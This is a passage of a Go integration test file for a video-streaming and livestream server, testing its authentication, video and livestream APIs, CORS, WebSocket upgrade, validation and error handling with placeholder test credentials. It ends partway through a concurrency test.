package server

import (
	"bytes"
	"context"
	"encoding/json"
	"fmt"
	"io"
	"mime/multipart"
	"net/http"
	"net/http/httptest"
	"os"
	"streamflow/internal/config"
	"streamflow/internal/database"
	"streamflow/internal/livestream"
	"streamflow/internal/users"
	"streamflow/internal/video"
	"strings"
	"sync"
	"testing"
	"time"

	"github.com/gofiber/fiber/v2"
	"github.com/stretchr/testify/assert"
	"github.com/stretchr/testify/require"
	"go.mongodb.org/mongo-driver/bson/primitive"
)

// Test server instance for integration tests
var testServer *FiberServer
var testConfig *config.Config
var testDB database.Service
var testUserService *users.UserService
var testJWTService *users.JWTService
var testVideoService *video.VideoService
var testLivestreamService *livestream.LivestreamService

// Test data
var (
	testUser = users.CreateUserRequest{
		UserName: "testuser",
		Email:    "test@example.com",
		Password: "testpassword123",
	}
	testUser2 = users.CreateUserRequest{
		UserName: "testuser2",
		Email:    "test2@example.com", 
		Password: "testpassword456",
	}
	testUserID primitive.ObjectID
	testToken  string
)

func TestMain(m *testing.M) {
	// Setup test server
	setupTestServer()
	defer teardownTestServer()

	// Run tests
	code := m.Run()
	os.Exit(code)
}

func setupTestServer() {
	// Load test configuration
	testConfig = &config.Config{
		Server: config.ServerConfig{
			Port:         8080,
			Host:         "localhost",
			ReadTimeout:  10 * time.Second,
			WriteTimeout: 10 * time.Second,
			IdleTimeout:  10 * time.Second,
		},
		Database: config.DatabaseConfig{
			Host: "localhost",
			Port: "27017",
			Name: "streamflow_test",
			URI:  "mongodb://localhost:27017",
		},
		JWT: config.JWTConfig{
			SecretKey:         "test-secret-key-for-testing-only",
			Expiration:        24 * time.Hour,
			RefreshExpiration: 7 * 24 * time.Hour,
		},
		Video: config.VideoConfig{
			UploadPath:    "test_uploads",
			ProcessedPath: "test_processed",
			MaxFileSize:   100 * 1024 * 1024, // 100MB
			AllowedTypes:  []string{"video/mp4", "video/avi", "video/mov", "video/mkv"},
		},
		Security: config.SecurityConfig{
			CORSOrigins: []string{"*"},
			RateLimit:   100,
			RateWindow:  1 * time.Minute,
		},
	}

	// Initialize services
	testDB = database.New()
	testUserService = users.NewUserService(testDB.GetDatabase())
	testJWTService = users.NewJWTService(testConfig.JWT.SecretKey)
	testVideoService = video.NewVideoService(testDB.GetDatabase())
	testLivestreamService = livestream.NewLiveStreamService(testDB.GetDatabase())

	// Create test server
	testServer = &FiberServer{
		App:               fiber.New(fiber.Config{ErrorHandler: customErrorHandler}),
		db:                testDB,
		userService:       testUserService,
		jwtService:        testJWTService,
		videoService:      testVideoService,
		livestreamService: testLivestreamService,
		cfg:               testConfig,
	}

	// Register routes
	testServer.RegisterFiberRoutes()

	// Create test directories
	os.MkdirAll(testConfig.Video.UploadPath, 0755)
	os.MkdirAll(testConfig.Video.ProcessedPath, 0755)

	// Setup test user and token
	setupTestUser()
}

func teardownTestServer() {
	if testDB != nil {
		testDB.Close()
	}
	// Clean up test directories
	os.RemoveAll(testConfig.Video.UploadPath)
	os.RemoveAll(testConfig.Video.ProcessedPath)
}

func setupTestUser() {
	ctx := context.Background()
	createdUser, err := testUserService.CreateUser(ctx, testUser)
	if err != nil {
		panic(fmt.Sprintf("Failed to create test user: %v", err))
	}
	testUserID = createdUser.ID

	testToken, err = testJWTService.GenerateToken(createdUser.ID)
	if err != nil {
		panic(fmt.Sprintf("Failed to generate test token: %v", err))
	}
}

// Helper functions
func makeRequest(method, url string, body io.Reader, headers map[string]string) (*http.Response, error) {
	req := httptest.NewRequest(method, url, body)
	for key, value := range headers {
		req.Header.Set(key, value)
	}
	return testServer.App.Test(req, -1) // -1 disables timeout
}

func makeAuthenticatedRequest(method, url string, body io.Reader, headers map[string]string) (*http.Response, error) {
	if headers == nil {
		headers = make(map[string]string)
	}
	headers["Authorization"] = "Bearer " + testToken
	return makeRequest(method, url, body, headers)
}

func readResponseBody(resp *http.Response) ([]byte, error) {
	defer resp.Body.Close()
	return io.ReadAll(resp.Body)
}

func createMultipartRequest(fields map[string]string, files map[string][]byte) (*bytes.Buffer, string, error) {
	body := &bytes.Buffer{}
	writer := multipart.NewWriter(body)

	// Add form fields
	for key, value := range fields {
		if err := writer.WriteField(key, value); err != nil {
			return nil, "", err
		}
	}

	// Add files
	for fieldName, fileContent := range files {
		part, err := writer.CreateFormFile(fieldName, "test.mp4")
		if err != nil {
			return nil, "", err
		}
		if _, err := part.Write(fileContent); err != nil {
			return nil, "", err
		}
	}

	contentType := writer.FormDataContentType()
	writer.Close()
	return body, contentType, nil
}

func TestHandler(t *testing.T) {
	req, err := http.NewRequest("GET", "/", nil)
	require.NoError(t, err)

	resp, err := testServer.App.Test(req)
	require.NoError(t, err)
	defer resp.Body.Close()

	assert.Equal(t, http.StatusOK, resp.StatusCode)

	body, err := io.ReadAll(resp.Body)
	require.NoError(t, err)

	expected := `{"message":"Hello World"}`
	assert.Equal(t, expected, string(body))
}

// =============================================================================
// HTTP Endpoint Testing
// =============================================================================

func TestHealthEndpoint(t *testing.T) {
	req, err := http.NewRequest("GET", "/health", nil)
	require.NoError(t, err)

	resp, err := testServer.App.Test(req)
	require.NoError(t, err)
	defer resp.Body.Close()

	assert.Equal(t, http.StatusOK, resp.StatusCode)
	
	body, err := io.ReadAll(resp.Body)
	require.NoError(t, err)
	
	var healthResponse map[string]interface{}
	err = json.Unmarshal(body, &healthResponse)
	require.NoError(t, err)
	
	// Health response should contain database status
	assert.Contains(t, healthResponse, "status")
}

func TestCORSHeaders(t *testing.T) {
	testCases := []struct {
		name   string
		method string
		url    string
	}{
		{"GET request", "GET", "/"},
		{"POST request", "POST", "/user/register"},
		{"OPTIONS request", "OPTIONS", "/api/user/me"},
	}

	for _, tc := range testCases {
		t.Run(tc.name, func(t *testing.T) {
			req, err := http.NewRequest(tc.method, tc.url, nil)
			require.NoError(t, err)
			req.Header.Set("Origin", "http://localhost:3000")

			resp, err := testServer.App.Test(req)
			require.NoError(t, err)
			defer resp.Body.Close()

			// Check CORS headers are present
			assert.Contains(t, resp.Header.Get("Access-Control-Allow-Origin"), "*")
			assert.Contains(t, resp.Header.Get("Access-Control-Allow-Methods"), "GET,POST,PUT,DELETE,OPTIONS,PATCH")
			assert.Contains(t, resp.Header.Get("Access-Control-Allow-Headers"), "Accept,Authorization,Content-Type")
		})
	}
}

// =============================================================================
// User Authentication and Registration Testing
// =============================================================================

func TestUserRegistration(t *testing.T) {
	testCases := []struct {
		name           string
		payload        interface{}
		expectedStatus int
		checkToken     bool
	}{
		{
			name: "Valid registration",
			payload: users.CreateUserRequest{
				UserName: "newuser",
				Email:    "newuser@example.com",
				Password: "newpassword123",
			},
			expectedStatus: http.StatusOK,
			checkToken:     true,
		},
		{
			name: "Invalid email format",
			payload: users.CreateUserRequest{
				UserName: "testuser",
				Email:    "invalid-email",
				Password: "password123",
			},
			expectedStatus: http.StatusBadRequest,
			checkToken:     false,
		},
		{
			name: "Short password",
			payload: users.CreateUserRequest{
				UserName: "testuser",
				Email:    "test@example.com",
				Password: "short",
			},
			expectedStatus: http.StatusBadRequest,
			checkToken:     false,
		},
		{
			name: "Missing username",
			payload: users.CreateUserRequest{
				Email:    "test@example.com",
				Password: "password123",
			},
			expectedStatus: http.StatusBadRequest,
			checkToken:     false,
		},
		{
			name:           "Invalid JSON",
			payload:        "invalid json",
			expectedStatus: http.StatusBadRequest,
			checkToken:     false,
		},
	}

	for _, tc := range testCases {
		t.Run(tc.name, func(t *testing.T) {
			var body []byte
			var err error
			
			if str, ok := tc.payload.(string); ok {
				body = []byte(str)
			} else {
				body, err = json.Marshal(tc.payload)
				require.NoError(t, err)
			}

			resp, err := makeRequest("POST", "/user/register", bytes.NewReader(body), map[string]string{
				"Content-Type": "application/json",
			})
			require.NoError(t, err)
			defer resp.Body.Close()

			assert.Equal(t, tc.expectedStatus, resp.StatusCode)

			responseBody, err := readResponseBody(resp)
			require.NoError(t, err)

			var response map[string]interface{}
			err = json.Unmarshal(responseBody, &response)
			require.NoError(t, err)

			if tc.checkToken {
				assert.Contains(t, response, "token")
				assert.Contains(t, response, "user")
				assert.Contains(t, response, "message")
			} else {
				assert.Contains(t, response, "error")
			}
		})
	}
}

func TestUserLogin(t *testing.T) {
	testCases := []struct {
		name           string
		payload        users.LoginUserRequest
		expectedStatus int
		checkToken     bool
	}{
		{
			name: "Valid login",
			payload: users.LoginUserRequest{
				Email:    testUser.Email,
				Password: testUser.Password,
			},
			expectedStatus: http.StatusOK,
			checkToken:     true,
		},
		{
			name: "Invalid password",
			payload: users.LoginUserRequest{
				Email:    testUser.Email,
				Password: "wrongpassword",
			},
			expectedStatus: http.StatusUnauthorized,
			checkToken:     false,
		},
		{
			name: "Invalid email",
			payload: users.LoginUserRequest{
				Email:    "nonexistent@example.com",
				Password: testUser.Password,
			},
			expectedStatus: http.StatusUnauthorized,
			checkToken:     false,
		},
		{
			name: "Missing password",
			payload: users.LoginUserRequest{
				Email: testUser.Email,
			},
			expectedStatus: http.StatusBadRequest,
			checkToken:     false,
		},
	}

	for _, tc := range testCases {
		t.Run(tc.name, func(t *testing.T) {
			body, err := json.Marshal(tc.payload)
			require.NoError(t, err)

			resp, err := makeRequest("POST", "/user/login", bytes.NewReader(body), map[string]string{
				"Content-Type": "application/json",
			})
			require.NoError(t, err)
			defer resp.Body.Close()

			assert.Equal(t, tc.expectedStatus, resp.StatusCode)

			responseBody, err := readResponseBody(resp)
			require.NoError(t, err)

			var response map[string]interface{}
			err = json.Unmarshal(responseBody, &response)
			require.NoError(t, err)

			if tc.checkToken {
				assert.Contains(t, response, "token")
				assert.Contains(t, response, "user")
				assert.Contains(t, response, "message")
			} else {
				assert.Contains(t, response, "error")
			}
		})
	}
}

// =============================================================================
// Authentication Integration Testing
// =============================================================================

func TestAuthenticationMiddleware(t *testing.T) {
	testCases := []struct {
		name           string
		token          string
		expectedStatus int
	}{
		{
			name:           "Valid token",
			token:          "Bearer " + testToken,
			expectedStatus: http.StatusOK,
		},
		{
			name:           "Missing authorization header",
			token:          "",
			expectedStatus: http.StatusUnauthorized,
		},
		{
			name:           "Invalid token format",
			token:          "InvalidToken",
			expectedStatus: http.StatusUnauthorized,
		},
		{
			name:           "Invalid Bearer format",
			token:          "Token " + testToken,
			expectedStatus: http.StatusUnauthorized,
		},
		{
			name:           "Expired/Invalid token",
			token:          "Bearer invalid.token.here",
			expectedStatus: http.StatusUnauthorized,
		},
	}

	for _, tc := range testCases {
		t.Run(tc.name, func(t *testing.T) {
			headers := make(map[string]string)
			if tc.token != "" {
				headers["Authorization"] = tc.token
			}

			resp, err := makeRequest("GET", "/api/user/me", nil, headers)
			require.NoError(t, err)
			defer resp.Body.Close()

			assert.Equal(t, tc.expectedStatus, resp.StatusCode)

			responseBody, err := readResponseBody(resp)
			require.NoError(t, err)

			var response map[string]interface{}
			err = json.Unmarshal(responseBody, &response)
			require.NoError(t, err)

			if tc.expectedStatus == http.StatusOK {
				assert.Contains(t, response, "user")
			} else {
				assert.Contains(t, response, "error")
			}
		})
	}
}

func TestGetUserProfile(t *testing.T) {
	resp, err := makeAuthenticatedRequest("GET", "/api/user/me", nil, nil)
	require.NoError(t, err)
	defer resp.Body.Close()

	assert.Equal(t, http.StatusOK, resp.StatusCode)

	responseBody, err := readResponseBody(resp)
	require.NoError(t, err)

	var response map[string]interface{}
	err = json.Unmarshal(responseBody, &response)
	require.NoError(t, err)

	assert.Contains(t, response, "user")
	assert.Contains(t, response, "message")
	
	user := response["user"].(map[string]interface{})
	assert.Equal(t, testUser.Email, user["email"])
	assert.Equal(t, testUser.UserName, user["user_name"])
}

// =============================================================================
// Video API Testing
// =============================================================================

func TestVideoUpload(t *testing.T) {
	// Create a simple video file content for testing
	testVideoContent := []byte("fake video content for testing")
	
	testCases := []struct {
		name           string
		fields         map[string]string
		files          map[string][]byte
		expectedStatus int
		useAuth        bool
	}{
		{
			name: "Valid video upload",
			fields: map[string]string{
				"title":       "Test Video",
				"description": "Test Description",
			},
			files: map[string][]byte{
				"video": testVideoContent,
			},
			expectedStatus: http.StatusCreated,
			useAuth:        true,
		},
		{
			name: "Missing title",
			fields: map[string]string{
				"description": "Test Description",
			},
			files: map[string][]byte{
				"video": testVideoContent,
			},
			expectedStatus: http.StatusBadRequest,
			useAuth:        true,
		},
		{
			name: "Missing video file",
			fields: map[string]string{
				"title":       "Test Video",
				"description": "Test Description",
			},
			files:          map[string][]byte{},
			expectedStatus: http.StatusBadRequest,
			useAuth:        true,
		},
		{
			name: "Unauthorized upload",
			fields: map[string]string{
				"title":       "Test Video",
				"description": "Test Description",
			},
			files: map[string][]byte{
				"video": testVideoContent,
			},
			expectedStatus: http.StatusUnauthorized,
			useAuth:        false,
		},
	}

	for _, tc := range testCases {
		t.Run(tc.name, func(t *testing.T) {
			body, contentType, err := createMultipartRequest(tc.fields, tc.files)
			require.NoError(t, err)

			headers := map[string]string{
				"Content-Type": contentType,
			}

			var resp *http.Response
			if tc.useAuth {
				resp, err = makeAuthenticatedRequest("POST", "/api/video/upload", body, headers)
			} else {
				resp, err = makeRequest("POST", "/api/video/upload", body, headers)
			}
			require.NoError(t, err)
			defer resp.Body.Close()

			assert.Equal(t, tc.expectedStatus, resp.StatusCode)

			responseBody, err := readResponseBody(resp)
			require.NoError(t, err)

			var response map[string]interface{}
			err = json.Unmarshal(responseBody, &response)
			require.NoError(t, err)

			if tc.expectedStatus == http.StatusCreated {
				assert.Contains(t, response, "id")
				assert.Contains(t, response, "title")
			} else {
				assert.Contains(t, response, "error")
			}
		})
	}
}

func TestVideoList(t *testing.T) {
	testCases := []struct {
		name           string
		queryParams    string
		expectedStatus int
		useAuth        bool
	}{
		{
			name:           "List videos with default pagination",
			queryParams:    "",
			expectedStatus: http.StatusOK,
			useAuth:        true,
		},
		{
			name:           "List videos with custom pagination",
			queryParams:    "?page=1&limit=5",
			expectedStatus: http.StatusOK,
			useAuth:        true,
		},
		{
			name:           "List videos with large limit",
			queryParams:    "?page=1&limit=100",
			expectedStatus: http.StatusOK,
			useAuth:        true,
		},
		{
			name:           "Unauthorized video list",
			queryParams:    "",
			expectedStatus: http.StatusUnauthorized,
			useAuth:        false,
		},
	}

	for _, tc := range testCases {
		t.Run(tc.name, func(t *testing.T) {
			url := "/api/video/list" + tc.queryParams
			
			var resp *http.Response
			var err error
			if tc.useAuth {
				resp, err = makeAuthenticatedRequest("GET", url, nil, nil)
			} else {
				resp, err = makeRequest("GET", url, nil, nil)
			}
			require.NoError(t, err)
			defer resp.Body.Close()

			assert.Equal(t, tc.expectedStatus, resp.StatusCode)

			responseBody, err := readResponseBody(resp)
			require.NoError(t, err)

			if tc.expectedStatus == http.StatusOK {
				var videos []interface{}
				err = json.Unmarshal(responseBody, &videos)
				require.NoError(t, err)
				assert.IsType(t, []interface{}{}, videos)
			}
		})
	}
}

func TestVideoOperations(t *testing.T) {
	// Use a fake video ID for testing
	testVideoID := primitive.NewObjectID()
	
	testCases := []struct {
		name           string
		method         string
		url            string
		body           interface{}
		expectedStatus int
		useAuth        bool
	}{
		{
			name:           "Get video by ID",
			method:         "GET",
			url:            "/api/video/" + testVideoID.Hex(),
			body:           nil,
			expectedStatus: http.StatusNotFound, // Will be 404 since video doesn't exist
			useAuth:        true,
		},
		{
			name:           "Get video with invalid ID",
			method:         "GET",
			url:            "/api/video/invalid-id",
			body:           nil,
			expectedStatus: http.StatusBadRequest,
			useAuth:        true,
		},
		{
			name:   "Update video",
			method: "PUT",
			url:    "/api/video/" + testVideoID.Hex(),
			body: map[string]interface{}{
				"title":       "Updated Title",
				"description": "Updated Description",
			},
			expectedStatus: http.StatusInternalServerError, // Will fail since video doesn't exist
			useAuth:        true,
		},
		{
			name:           "Delete video",
			method:         "DELETE",
			url:            "/api/video/" + testVideoID.Hex(),
			body:           nil,
			expectedStatus: http.StatusInternalServerError, // Will fail since video doesn't exist
			useAuth:        true,
		},
		{
			name:           "Unauthorized video access",
			method:         "GET",
			url:            "/api/video/" + testVideoID.Hex(),
			body:           nil,
			expectedStatus: http.StatusUnauthorized,
			useAuth:        false,
		},
	}

	for _, tc := range testCases {
		t.Run(tc.name, func(t *testing.T) {
			var bodyReader io.Reader
			if tc.body != nil {
				bodyBytes, err := json.Marshal(tc.body)
				require.NoError(t, err)
				bodyReader = bytes.NewReader(bodyBytes)
			}

			headers := map[string]string{}
			if tc.body != nil {
				headers["Content-Type"] = "application/json"
			}

			var resp *http.Response
			var err error
			if tc.useAuth {
				resp, err = makeAuthenticatedRequest(tc.method, tc.url, bodyReader, headers)
			} else {
				resp, err = makeRequest(tc.method, tc.url, bodyReader, headers)
			}
			require.NoError(t, err)
			defer resp.Body.Close()

			assert.Equal(t, tc.expectedStatus, resp.StatusCode)
		})
	}
}

// =============================================================================
// Video Streaming Endpoints Testing
// =============================================================================

func TestVideoStreamingEndpoints(t *testing.T) {
	testVideoID := primitive.NewObjectID()
	
	testCases := []struct {
		name           string
		url            string
		expectedStatus int
		checkHeaders   bool
	}{
		{
			name:           "Stream video (public endpoint)",
			url:            "/stream/" + testVideoID.Hex(),
			expectedStatus: http.StatusNotFound, // Video doesn't exist
			checkHeaders:   false,
		},
		{
			name:           "Stream video with seek time",
			url:            "/stream/" + testVideoID.Hex() + "?t=30",
			expectedStatus: http.StatusNotFound, // Video doesn't exist
			checkHeaders:   false,
		},
		{
			name:           "Get video thumbnail",
			url:            "/thumbnail/" + testVideoID.Hex(),
			expectedStatus: http.StatusNotFound, // Video doesn't exist
			checkHeaders:   false,
		},
		{
			name:           "Get video timestamp",
			url:            "/video/" + testVideoID.Hex() + "/timestamp",
			expectedStatus: http.StatusNotFound, // Video doesn't exist
			checkHeaders:   false,
		},
		{
			name:           "Serve video segment",
			url:            "/stream/" + testVideoID.Hex() + "/segments/segment001.ts",
			expectedStatus: http.StatusNotFound, // Video doesn't exist
			checkHeaders:   false,
		},
		{
			name:           "Invalid video ID for streaming",
			url:            "/stream/invalid-id",
			expectedStatus: http.StatusBadRequest,
			checkHeaders:   false,
		},
	}

	for _, tc := range testCases {
		t.Run(tc.name, func(t *testing.T) {
			resp, err := makeRequest("GET", tc.url, nil, nil)
			require.NoError(t, err)
			defer resp.Body.Close()

			assert.Equal(t, tc.expectedStatus, resp.StatusCode)
		})
	}
}

func TestVideoPopularAndTrending(t *testing.T) {
	testCases := []struct {
		name           string
		url            string
		expectedStatus int
		useAuth        bool
	}{
		{
			name:           "Get popular videos",
			url:            "/api/video/popular",
			expectedStatus: http.StatusOK,
			useAuth:        true,
		},
		{
			name:           "Get popular videos with limit",
			url:            "/api/video/popular?limit=5",
			expectedStatus: http.StatusOK,
			useAuth:        true,
		},
		{
			name:           "Get popular videos with excessive limit",
			url:            "/api/video/popular?limit=100",
			expectedStatus: http.StatusOK, // Should cap at 50
			useAuth:        true,
		},
		{
			name:           "Get trending videos",
			url:            "/api/video/trending",
			expectedStatus: http.StatusOK,
			useAuth:        true,
		},
		{
			name:           "Get trending videos with custom params",
			url:            "/api/video/trending?limit=10&days=7",
			expectedStatus: http.StatusOK,
			useAuth:        true,
		},
		{
			name:           "Unauthorized popular videos",
			url:            "/api/video/popular",
			expectedStatus: http.StatusUnauthorized,
			useAuth:        false,
		},
	}

	for _, tc := range testCases {
		t.Run(tc.name, func(t *testing.T) {
			var resp *http.Response
			var err error
			if tc.useAuth {
				resp, err = makeAuthenticatedRequest("GET", tc.url, nil, nil)
			} else {
				resp, err = makeRequest("GET", tc.url, nil, nil)
			}
			require.NoError(t, err)
			defer resp.Body.Close()

			assert.Equal(t, tc.expectedStatus, resp.StatusCode)

			if tc.expectedStatus == http.StatusOK {
				responseBody, err := readResponseBody(resp)
				require.NoError(t, err)

				var videos []interface{}
				err = json.Unmarshal(responseBody, &videos)
				require.NoError(t, err)
				assert.IsType(t, []interface{}{}, videos)
			}
		})
	}
}

// =============================================================================
// Livestream API Testing
// =============================================================================

func TestLivestreamOperations(t *testing.T) {
	testStreamID := primitive.NewObjectID()
	
	testCases := []struct {
		name           string
		method         string
		url            string
		body           interface{}
		expectedStatus int
		useAuth        bool
	}{
		{
			name:   "Start stream",
			method: "POST",
			url:    "/api/livestream/start",
			body: map[string]interface{}{
				"title":       "Test Stream",
				"description": "Test stream description",
			},
			expectedStatus: http.StatusOK,
			useAuth:        true,
		},
		{
			name:   "Start stream without title",
			method: "POST",
			url:    "/api/livestream/start",
			body:   map[string]interface{}{},
			expectedStatus: http.StatusBadRequest,
			useAuth:        true,
		},
		{
			name:           "Get stream status",
			method:         "GET",
			url:            "/api/livestream/status/" + testStreamID.Hex(),
			body:           nil,
			expectedStatus: http.StatusInternalServerError, // Stream doesn't exist
			useAuth:        true,
		},
		{
			name:           "Get stream status with invalid ID",
			method:         "GET",
			url:            "/api/livestream/status/invalid-id",
			body:           nil,
			expectedStatus: http.StatusBadRequest,
			useAuth:        true,
		},
		{
			name:           "List streams",
			method:         "GET",
			url:            "/api/livestream/streams",
			body:           nil,
			expectedStatus: http.StatusOK,
			useAuth:        true,
		},
		{
			name:           "Get popular streams",
			method:         "GET",
			url:            "/api/livestream/popular",
			body:           nil,
			expectedStatus: http.StatusOK,
			useAuth:        true,
		},
		{
			name:           "Search streams",
			method:         "GET",
			url:            "/api/livestream/search?q=test",
			body:           nil,
			expectedStatus: http.StatusOK,
			useAuth:        true,
		},
		{
			name:           "Unauthorized stream operations",
			method:         "POST",
			url:            "/api/livestream/start",
			body:           map[string]interface{}{"title": "Test"},
			expectedStatus: http.StatusUnauthorized,
			useAuth:        false,
		},
	}

	for _, tc := range testCases {
		t.Run(tc.name, func(t *testing.T) {
			var bodyReader io.Reader
			if tc.body != nil {
				bodyBytes, err := json.Marshal(tc.body)
				require.NoError(t, err)
				bodyReader = bytes.NewReader(bodyBytes)
			}

			headers := map[string]string{}
			if tc.body != nil {
				headers["Content-Type"] = "application/json"
			}

			var resp *http.Response
			var err error
			if tc.useAuth {
				resp, err = makeAuthenticatedRequest(tc.method, tc.url, bodyReader, headers)
			} else {
				resp, err = makeRequest(tc.method, tc.url, bodyReader, headers)
			}
			require.NoError(t, err)
			defer resp.Body.Close()

			assert.Equal(t, tc.expectedStatus, resp.StatusCode)

			responseBody, err := readResponseBody(resp)
			require.NoError(t, err)

			if len(responseBody) > 0 {
				var response map[string]interface{}
				err = json.Unmarshal(responseBody, &response)
				if err == nil {
					if tc.expectedStatus >= 200 && tc.expectedStatus < 300 {
						// Success responses should have proper structure
						if tc.method == "GET" && strings.Contains(tc.url, "/streams") {
							// List operations return arrays
							var arrayResponse []interface{}
							err = json.Unmarshal(responseBody, &arrayResponse)
							require.NoError(t, err)
						}
					} else {
						// Error responses should have error field
						assert.Contains(t, response, "error")
					}
				}
			}
		})
	}
}

// =============================================================================
// WebSocket Endpoints Testing
// =============================================================================

func TestWebSocketUpgrade(t *testing.T) {
	testCases := []struct {
		name           string
		headers        map[string]string
		expectedStatus int
	}{
		{
			name: "Valid WebSocket upgrade",
			headers: map[string]string{
				"Upgrade":               "websocket",
				"Connection":            "Upgrade",
				"Sec-WebSocket-Key":     "dGhlIHNhbXBsZSBub25jZQ==",
				"Sec-WebSocket-Version": "13",
			},
			expectedStatus: http.StatusSwitchingProtocols,
		},
		{
			name:           "Missing WebSocket headers",
			headers:        map[string]string{},
			expectedStatus: http.StatusBadRequest, // Upgrade Required
		},
		{
			name: "Invalid WebSocket version",
			headers: map[string]string{
				"Upgrade":               "websocket",
				"Connection":            "Upgrade",
				"Sec-WebSocket-Key":     "dGhlIHNhbXBsZSBub25jZQ==",
				"Sec-WebSocket-Version": "12",
			},
			expectedStatus: http.StatusBadRequest,
		},
	}

	for _, tc := range testCases {
		t.Run(tc.name, func(t *testing.T) {
			resp, err := makeRequest("GET", "/ws", nil, tc.headers)
			require.NoError(t, err)
			defer resp.Body.Close()

			// WebSocket upgrade might succeed or fail based on implementation
			// We mainly check that the endpoint responds appropriately
			assert.True(t, resp.StatusCode == http.StatusSwitchingProtocols || 
					   resp.StatusCode == http.StatusBadRequest ||
					   resp.StatusCode == http.StatusUpgradeRequired)
		})
	}
}

// =============================================================================
// Error Response Handling Testing
// =============================================================================

func TestErrorHandling(t *testing.T) {
	testCases := []struct {
		name             string
		method           string
		url              string
		body             string
		headers          map[string]string
		expectedStatus   int
		expectErrorField bool
	}{
		{
			name:             "Invalid JSON payload",
			method:           "POST",
			url:              "/user/register",
			body:             "{invalid json",
			headers:          map[string]string{"Content-Type": "application/json"},
			expectedStatus:   http.StatusBadRequest,
			expectErrorField: true,
		},
		{
			name:             "Large request body",
			method:           "POST",
			url:              "/user/register",
			body:             strings.Repeat("a", 10*1024*1024), // 10MB
			headers:          map[string]string{"Content-Type": "application/json"},
			expectedStatus:   http.StatusBadRequest,
			expectErrorField: true,
		},
		{
			name:             "Unsupported content type",
			method:           "POST",
			url:              "/user/register",
			body:             "test data",
			headers:          map[string]string{"Content-Type": "text/plain"},
			expectedStatus:   http.StatusBadRequest,
			expectErrorField: true,
		},
		{
			name:             "Non-existent endpoint",
			method:           "GET",
			url:              "/api/nonexistent",
			body:             "",
			headers:          map[string]string{},
			expectedStatus:   http.StatusNotFound,
			expectErrorField: false, // Fiber returns HTML for 404
		},
		{
			name:             "Method not allowed",
			method:           "PATCH",
			url:              "/",
			body:             "",
			headers:          map[string]string{},
			expectedStatus:   http.StatusMethodNotAllowed,
			expectErrorField: false,
		},
	}

	for _, tc := range testCases {
		t.Run(tc.name, func(t *testing.T) {
			var bodyReader io.Reader
			if tc.body != "" {
				bodyReader = strings.NewReader(tc.body)
			}
			
			resp, err := makeRequest(tc.method, tc.url, bodyReader, tc.headers)
			require.NoError(t, err)
			defer resp.Body.Close()

			assert.Equal(t, tc.expectedStatus, resp.StatusCode)

			responseBody, err := readResponseBody(resp)
			require.NoError(t, err)

			if tc.expectErrorField && len(responseBody) > 0 {
				var response map[string]interface{}
				err = json.Unmarshal(responseBody, &response)
				if err == nil {
					assert.Contains(t, response, "error")
				}
			}
		})
	}
}

// =============================================================================
// Request Validation Testing  
// =============================================================================

func TestRequestValidation(t *testing.T) {
	testCases := []struct {
		name           string
		method         string
		url            string
		contentType    string
		body           string
		expectedStatus int
	}{
		{
			name:           "Valid JSON content type",
			method:         "POST",
			url:            "/user/register",
			contentType:    "application/json",
			body:           `{"user_name":"test","email":"test@example.com","password":"password123"}`,
			expectedStatus: http.StatusOK,
		},
		{
			name:           "Missing content type",
			method:         "POST",
			url:            "/user/register",
			contentType:    "",
			body:           `{"user_name":"test","email":"test@example.com","password":"password123"}`,
			expectedStatus: http.StatusBadRequest,
		},
		{
			name:           "Invalid content type",
			method:         "POST",
			url:            "/user/register",
			contentType:    "text/plain",  
			body:           `{"user_name":"test","email":"test@example.com","password":"password123"}`,
			expectedStatus: http.StatusBadRequest,
		},
		{
			name:           "Empty request body",
			method:         "POST",
			url:            "/user/register",
			contentType:    "application/json",
			body:           "",
			expectedStatus: http.StatusBadRequest,
		},
		{
			name:           "Malformed JSON",
			method:         "POST",
			url:            "/user/register",
			contentType:    "application/json",
			body:           `{"user_name":"test","email":"test@example.com","password":}`,
			expectedStatus: http.StatusBadRequest,
		},
	}

	for _, tc := range testCases {
		t.Run(tc.name, func(t *testing.T) {
			headers := map[string]string{}
			if tc.contentType != "" {
				headers["Content-Type"] = tc.contentType
			}

			resp, err := makeRequest(tc.method, tc.url, strings.NewReader(tc.body), headers)
			require.NoError(t, err)
			defer resp.Body.Close()

			assert.Equal(t, tc.expectedStatus, resp.StatusCode)
		})
	}
}

// =============================================================================
// File Upload Testing
// =============================================================================

func TestFileUploadValidation(t *testing.T) {
	testCases := []struct {
		name           string
		fileName       string
		fileContent    []byte
		fileSize       int64
		expectedStatus int
	}{
		{
			name:           "Valid small file",
			fileName:       "test.mp4",
			fileContent:    []byte("valid video content"),
			fileSize:       19,
			expectedStatus: http.StatusCreated,
		},
		{
			name:           "Empty file",
			fileName:       "empty.mp4",
			fileContent:    []byte(""),
			fileSize:       0,
			expectedStatus: http.StatusBadRequest,
		},
		{
			name:           "Invalid file extension",
			fileName:       "test.txt",
			fileContent:    []byte("not a video file"),
			fileSize:       16,
			expectedStatus: http.StatusBadRequest,
		},
		{
			name:           "Very large file name simulation",
			fileName:       "test_" + strings.Repeat("a", 255) + ".mp4",
			fileContent:    []byte("video content"),
			fileSize:       13,
			expectedStatus: http.StatusBadRequest,
		},
	}

	for _, tc := range testCases {
		t.Run(tc.name, func(t *testing.T) {
			fields := map[string]string{
				"title":       "Test Video",
				"description": "Test Description",
			}

			files := map[string][]byte{
				"video": tc.fileContent,
			}

			body, contentType, err := createMultipartRequest(fields, files)
			require.NoError(t, err)

			headers := map[string]string{
				"Content-Type": contentType,
			}

			resp, err := makeAuthenticatedRequest("POST", "/api/video/upload", body, headers)
			require.NoError(t, err)
			defer resp.Body.Close()

			assert.Equal(t, tc.expectedStatus, resp.StatusCode)
		})
	}
}

// =============================================================================
// Performance and Load Testing
// =============================================================================

func TestConcurrentRequests(t *testing.T) {
	const numRequests = 10
	const numWorkers = 5

	var wg sync.WaitGroup
	requestCh := make(chan int, numRequests)
	resultCh := make(chan bool, numRequests)

	// Create workers
	for i := 0; i < numWorkers; i++ {
		go func() {
			for range requestCh {
				resp, err := makeAuthenticatedRequest("GET", "/api/user/me", nil, nil)
				if err != nil {
					resultCh <- false
					continue
				}
				resp.Body.Close()
				resultCh <- resp.StatusCode == http.StatusOK
			}
		}()
	}

	// Send requests
	wg.Add(1)
	go func() {
		defer wg.Done()
		for i := 0; i < numRequests; i++ {
			requestCh <- i
		}
		close(requestCh)
	}()

	// Wait for completion
	wg.Wait()
	close(resultCh)

	// Count successful requests
	successCount := 0
	for success := range resultCh {
		if success {
			successCount++
		}
	}

	// At least 80% of requests should succeed under concurrent load
